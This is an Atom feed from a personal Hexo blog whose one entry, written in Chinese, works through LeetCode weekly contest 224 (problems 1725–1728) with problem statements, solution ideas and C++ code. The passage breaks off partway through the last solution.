<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>blow in the wind</title>
  
  <subtitle>no one will be your god, your god is just yourself!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-01-18T05:29:46.515Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Mike meng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【Leetcode】  周赛224场</title>
    <link href="http://yoursite.com/2021/01/18/244/"/>
    <id>http://yoursite.com/2021/01/18/244/</id>
    <published>2021-01-18T01:58:59.575Z</published>
    <updated>2021-01-18T05:29:46.515Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-weekly-contest-224"><a href="#leetcode-weekly-contest-224" class="headerlink" title="leetcode  weekly contest 224"></a>leetcode  weekly contest 224</h1><p>本周的题目最后一题好像很难，只做出来了前三题，想通了之后就特别简单。</p><h2 id="1725-可以形成最大正方形的矩形数目"><a href="#1725-可以形成最大正方形的矩形数目" class="headerlink" title="1725. 可以形成最大正方形的矩形数目"></a>1725. 可以形成最大正方形的矩形数目</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你一个数组 <code>rectangles</code> ，其中 <code>rectangles[i] = [li, wi]</code> 表示第 <code>i</code> 个矩形的长度为 <code>li</code> 、宽度为 <code>wi</code> 。</p><a id="more"></a><p>如果存在 k 同时满足 <code>k &lt;= li</code> 和 <code>k &lt;= wi</code> ，就可以将第 <code>i</code>个矩形切成边长为 <code>k</code>的正方形。例如，矩形<code>[4,6]</code>可以切成边长最大为 4 的正方形。</p><p>设 <code>maxLen</code>为可以从矩形数组 <code>rectangles</code> 切分得到的 最大正方形 的边长。</p><p>返回可以切出边长为 <code>maxLen</code> 的正方形的矩形 数目 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：rectangles = [[<span class="number">5</span>,<span class="number">8</span>],[<span class="number">3</span>,<span class="number">9</span>],[<span class="number">5</span>,<span class="number">12</span>],[<span class="number">16</span>,<span class="number">5</span>]]</span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：能从每个矩形中切出的最大正方形边长分别是 [<span class="number">5</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>] 。</span><br><span class="line">最大正方形的边长为 <span class="number">5</span> ，可以由 <span class="number">3</span> 个矩形切分得到。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：rectangles = [[<span class="number">2</span>,<span class="number">3</span>],[<span class="number">3</span>,<span class="number">7</span>],[<span class="number">4</span>,<span class="number">3</span>],[<span class="number">3</span>,<span class="number">7</span>]]</span><br><span class="line">输出：<span class="number">3</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= rectangles.length &lt;= 1000</code></li><li><code>rectangles[i].length == 2</code></li><li><code>1 &lt;= li, wi &lt;= 109</code></li><li><code>li != wi</code></li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/number-of-rectangles-that-can-form-the-largest-square" target="_blank" rel="noopener">https://leetcode-cn.com/problems/number-of-rectangles-that-can-form-the-largest-square</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  异或</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>贪心算法，直接<code>hash</code>统计最大的矩形的数目即可。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countGoodRectangles</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; rectangles)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> row = rectangles.size();</span><br><span class="line">        <span class="keyword">int</span> col = rectangles[<span class="number">0</span>].size();</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; cnt;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : rectangles)&#123;</span><br><span class="line">            cnt[min(v[<span class="number">0</span>],v[<span class="number">1</span>])]++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> cnt.rbegin()-&gt;second;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="1726-同积元组"><a href="#1726-同积元组" class="headerlink" title="1726. 同积元组"></a>1726. 同积元组</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你一个由 不同 正整数组成的数组 nums ，请你返回满足 <code>a * b = c * d</code>的元组 <code>(a, b, c, d)</code> 的数量。其中 <code>a、b、c</code>和 <code>d</code>都是<code>nums</code>中的元素，且 <code>a != b != c != d</code> 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>]</span><br><span class="line">输出：<span class="number">8</span></span><br><span class="line">解释：存在 <span class="number">8</span> 个满足题意的元组：</span><br><span class="line">(<span class="number">2</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>) , (<span class="number">2</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>) , (<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>) , (<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>)</span><br><span class="line">(<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>) , (<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">6</span>) , (<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">2</span>) , (<span class="number">4</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">10</span>]</span><br><span class="line">输出：<span class="number">16</span></span><br><span class="line">解释：存在 <span class="number">16</span> 个满足题意的元组：</span><br><span class="line">(<span class="number">1</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">5</span>) , (<span class="number">1</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">2</span>) , (<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>) , (<span class="number">10</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>)</span><br><span class="line">(<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">10</span>) , (<span class="number">2</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">1</span>) , (<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">10</span>) , (<span class="number">5</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">1</span>)</span><br><span class="line">(<span class="number">2</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>) , (<span class="number">2</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">4</span>) , (<span class="number">10</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>) , (<span class="number">10</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">(<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">10</span>) , (<span class="number">4</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">2</span>) , (<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">10</span>) , (<span class="number">5</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">12</span>]</span><br><span class="line">输出：<span class="number">40</span></span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>]</span><br><span class="line">输出：<span class="number">0</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= nums.length &lt;= 1000</code></li><li><code>1 &lt;= nums[i] &lt;= 104</code></li><li><code>nums</code>中的所有元素 互不相同</li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/tuple-with-same-product" target="_blank" rel="noopener">https://leetcode-cn.com/problems/tuple-with-same-product</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 排列组合,数学问题</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>题目中的关键点在于所有元素的数字都各不相同，我们求出所有的可能的两个数的积即可。</li><li>我们统计所有可能的两个数的积的数量，利用排列组合抽样,假设某个积$x$的组合数量为$n$.则按照题意要求，满足四个数的乘积相等，且积为$x$的可能组合数为:<script type="math/tex; mode=display">count(x) = 8*C_{n}^{2} = 4*(n-1)*n</script><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">tupleSameProduct</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; cnt;</span><br><span class="line">        sort(nums.begin(),nums.end());</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; n; ++j)&#123;</span><br><span class="line">                cnt[nums[i]*nums[j]]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : cnt)&#123;</span><br><span class="line">            <span class="keyword">if</span>(v.second &gt; <span class="number">1</span>)&#123;</span><br><span class="line">                ans += v.second*(v.second<span class="number">-1</span>)*<span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="1727-重新排列后的最大子矩阵"><a href="#1727-重新排列后的最大子矩阵" class="headerlink" title="1727. 重新排列后的最大子矩阵"></a>1727. 重新排列后的最大子矩阵</h2><p>给你一个二进制矩阵 <code>matrix</code> ，它的大小为 <code>m x n</code>，你可以将 <code>matrix</code> 中的 列 按任意顺序重新排列。</p><p>请你返回最优方案下将 <code>matrix</code> 重新排列后，全是<code>1</code> 的子矩阵面积。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">解释：你可以按照上图方式重新排列矩阵的每一列。</span><br><span class="line">最大的全 <span class="number">1</span> 子矩阵是上图中加粗的部分，面积为 <span class="number">4</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：你可以按照上图方式重新排列矩阵的每一列。</span><br><span class="line">最大的全 <span class="number">1</span> 子矩阵是上图中加粗的部分，面积为 <span class="number">3</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：由于你只能整列整列重新排布，所以没有比面积为 <span class="number">2</span> 更大的全 <span class="number">1</span> 子矩形。</span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：由于矩阵中没有 <span class="number">1</span> ，没有任何全 <span class="number">1</span> 的子矩阵，所以面积为 <span class="number">0</span> 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>m == matrix.length</code></li><li><code>n == matrix[i].length</code></li><li><code>1 &lt;= m * n &lt;= 105</code></li><li><code>matrix[i][j]</code> 要么是 0 ，要么是 1 。</li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/largest-submatrix-with-rearrangements" target="_blank" rel="noopener">https://leetcode-cn.com/problems/largest-submatrix-with-rearrangements</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 滑动窗口和贪心法枚举</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>首先直接求肯定不可能，我们仔细思索一下，我们以第<code>i</code>行为矩形的最下册的边，且以<code>(i,j)</code>为右下定点的可能待选矩形中的最大面积是多少？我们可以枚举所有右下顶点为<code>(i,j)</code>的矩形，选择最大的即可。</li><li>通过上述思路的思考，我们是否可以转变下思路，求每个出第<code>i</code>列的连续的<code>1</code>的最大窗口。比如<code>dp[i][j]</code>则代表，第<code>j</code>列，且以第<code>i</code>行为结尾的最长连续的<code>1</code>的数目，实际上也为矩形的高度。</li><li>如下图所示，我们将所有以<code>i</code>行为结尾且宽度为<code>1</code>的矩形按照高度从高到底排列，进行排列。此时我们即可以枚举以第<code>i</code>行为结尾的所有可能的最大的矩形的数目。<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|</span><br><span class="line">|<span class="string"> </span>|</span><br><span class="line">|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br></pre></td></tr></table></figure><script type="math/tex; mode=display">cnt[i] = max(cnt[i],dp[i][k]*(k+1)_{k=0}^{col-1})</script></li><li>空间复杂度可以优化到$O(n)$,时间复杂度为$O(nlg(n))$.<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">largestSubmatrix</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> row = matrix.size();</span><br><span class="line">        <span class="keyword">int</span> col = matrix[<span class="number">0</span>].size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; cnt(row+<span class="number">1</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(col,<span class="number">0</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*inntial*/</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; ++i)&#123;</span><br><span class="line">            <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dp;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[i][j])&#123;</span><br><span class="line">                    cnt[i+<span class="number">1</span>][j] = cnt[i][j] + <span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    cnt[i+<span class="number">1</span>][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(cnt[i+<span class="number">1</span>][j] &gt; <span class="number">0</span>) dp.push_back(cnt[i+<span class="number">1</span>][j]);</span><br><span class="line">            &#125;</span><br><span class="line">            sort(dp.begin(),dp.end(),[&amp;](<span class="keyword">const</span> <span class="keyword">int</span> &amp; a, <span class="keyword">const</span> <span class="keyword">int</span> &amp; b)&#123;</span><br><span class="line">                <span class="keyword">return</span> a &gt; b;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; dp.size(); ++j)&#123;</span><br><span class="line">                ans = max(ans,dp[j]*(j+<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="1728-猫和老鼠-II"><a href="#1728-猫和老鼠-II" class="headerlink" title="1728. 猫和老鼠 II"></a>1728. 猫和老鼠 II</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>一只猫和一只老鼠在玩一个叫做猫和老鼠的游戏。</p><p>它们所处的环境设定是一个 rows x cols 的方格 grid ，其中每个格子可能是一堵墙、一块地板、一位玩家（猫或者老鼠）或者食物。</p><ul><li>玩家由字符 ‘C’ （代表猫）和 ‘M’ （代表老鼠）表示。</li><li>地板由字符 ‘.’ 表示，玩家可以通过这个格子。</li><li>墙用字符 ‘#’ 表示，玩家不能通过这个格子。</li><li>食物用字符 ‘F’ 表示，玩家可以通过这个格子。</li><li><p>字符 ‘C’ ， ‘M’ 和 ‘F’ 在 grid 中都只会出现一次。<br>猫和老鼠按照如下规则移动：</p></li><li><p>老鼠 先移动 ，然后两名玩家轮流移动。</p></li><li>每一次操作时，猫和老鼠可以跳到上下左右四个方向之一的格子，他们不能跳过墙也不能跳出 grid 。</li><li>catJump 和 mouseJump 是猫和老鼠分别跳一次能到达的最远距离，它们也可以跳小于最大距离的长度。</li><li>它们可以停留在原地。</li><li>老鼠可以跳跃过猫的位置。<br>游戏有 4 种方式会结束：</li><li>如果猫跟老鼠处在相同的位置，那么猫获胜。</li><li>如果猫先到达食物，那么猫获胜。</li><li>如果老鼠先到达食物，那么老鼠获胜。</li><li>如果老鼠不能在 1000 次操作以内到达食物，那么猫获胜。<br>给你 <code>rows x cols</code> 的矩阵 grid 和两个整数 <code>catJump</code>和 <code>mouseJump</code> ，双方都采取最优策略，如果老鼠获胜，那么请你返回 <code>true</code> ，否则返回 <code>false</code> 。</li></ul><p>示例 1：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">grid</span> = [<span class="string">"####F"</span>,<span class="string">"#C..."</span>,<span class="string">"M...."</span>], <span class="attr">catJump</span> = <span class="number">1</span>, <span class="attr">mouseJump</span> = <span class="number">2</span></span><br><span class="line">输出：<span class="literal">true</span></span><br><span class="line">解释：猫无法抓到老鼠，也没法比老鼠先到达食物。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">grid</span> = [<span class="string">"M.C...F"</span>], <span class="attr">catJump</span> = <span class="number">1</span>, <span class="attr">mouseJump</span> = <span class="number">4</span></span><br><span class="line">输出：<span class="literal">true</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">grid</span> = [<span class="string">"M.C...F"</span>], <span class="attr">catJump</span> = <span class="number">1</span>, <span class="attr">mouseJump</span> = <span class="number">3</span></span><br><span class="line">输出：<span class="literal">false</span></span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">grid</span> = [<span class="string">"C...#"</span>,<span class="string">"...#F"</span>,<span class="string">"....#"</span>,<span class="string">"M...."</span>], <span class="attr">catJump</span> = <span class="number">2</span>, <span class="attr">mouseJump</span> = <span class="number">5</span></span><br><span class="line">输出：<span class="literal">false</span></span><br></pre></td></tr></table></figure><br>示例 5：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">grid</span> = [<span class="string">".M..."</span>,<span class="string">"..#.."</span>,<span class="string">"#..#."</span>,<span class="string">"C#.#."</span>,<span class="string">"...#F"</span>], <span class="attr">catJump</span> = <span class="number">3</span>, <span class="attr">mouseJump</span> = <span class="number">1</span></span><br><span class="line">输出：<span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>rows == grid.length</code></li><li><code>cols = grid[i].length</code></li><li><code>1 &lt;= rows, cols &lt;= 8</code></li><li><code>grid[i][j]</code> 只包含字符 <code>&#39;C&#39; ，&#39;M&#39; ，&#39;F&#39; ，&#39;.&#39; 和 &#39;#&#39;</code> 。</li><li><code>grid</code> 中只包含一个<code>&#39;C&#39; ，&#39;M&#39; 和 &#39;F&#39;</code>。</li><li><code>1 &lt;= catJump, mouseJump &lt;= 8</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/cat-and-mouse-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/cat-and-mouse-ii</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> NP + 暴力记忆化DFS搜索</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>本质为<code>np</code>问题，方法还是暴力搜索加剪枝，毫无技巧性可言。</li><li>用<code>dfs</code>暴力搜索即可，遍历所有可能的状态。$dp[round][cx][cy][mx][my][curr]$表示在第<code>round</code>次操作，且此时猫在坐标<code>(cx,cy)</code>,老鼠在<code>(mx,my)</code>时，且当前移动为<code>curr</code>时，是否会输赢。</li><li>通过记忆式搜索，本质跟玩石子游戏没有差多少，不过状态和剪枝稍微麻烦点，不太喜欢这类题目。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> cx, cy, mx, my, fx, fy;</span><br><span class="line">    <span class="keyword">int</span> dp[<span class="number">100</span>][<span class="number">8</span>][<span class="number">8</span>][<span class="number">8</span>][<span class="number">8</span>][<span class="number">2</span>]; <span class="comment">// 0 cat win  1 mouse win</span></span><br><span class="line">    <span class="keyword">int</span> cj, mj;</span><br><span class="line">    <span class="keyword">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; G;</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> turn, <span class="keyword">int</span> mx, <span class="keyword">int</span> my, 